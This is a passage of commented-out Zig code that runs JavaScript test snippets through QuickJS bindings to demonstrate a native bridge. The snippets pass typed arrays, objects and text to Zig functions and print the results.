//         \\const result = Native.processTypedArray(buffer);
//         \\console.log("Result from Zig (zero-copy!):", result);
//         \\result;
//     ;
//     const result3 = z.qjs.JS_Eval(
//         ctx,
//         test3,
//         test3.len,
//         "<test3>",
//         0,
//     );
//     defer z.qjs.JS_FreeValue(ctx, result3);

//     // Test 4: Process object
//     z.print("\n--- Test 4: Process Object ---\n", .{});
//     const test4 =
//         \\const obj = { x: 10, y: 20, values: [1, 2, 3, 4, 5] };
//         \\console.log("Input object:", JSON.stringify(obj));
//         \\const result = Native.processObject(obj);
//         \\console.log("Result from Zig:", result);
//         \\result;
//     ;
//     const result4 = z.qjs.JS_Eval(
//         ctx,
//         test4,
//         test4.len,
//         "<test4>",
//         0,
//     );
//     defer z.qjs.JS_FreeValue(ctx, result4);

//     // Test 5: Process text
//     z.print("\n--- Test 5: Text Processing ---\n", .{});
//     const test5 =
//         \\const messy = "Hello   World  !  How   are   you?";
//         \\console.log("Input text:", messy);
//         \\const clean = Native.processText(messy);
//         \\console.log("Cleaned by Zig:", clean);
//         \\clean;
//     ;
//     const result5 = z.qjs.JS_Eval(
//         ctx,
//         test5,
//         test5.len,
//         "<test5>",
//         0,
//     );
//     defer z.qjs.JS_FreeValue(ctx, result5);

//     z.print("\n✅ Native bridge working!\n", .{});
//     z.print("  • JavaScript can call Zig functions\n", .{});
//     z.print("  • Data flows: JS → Zig → JS\n", .{});
//     z.print("  • Heavy computation runs at native speed\n\n", .{});
// }
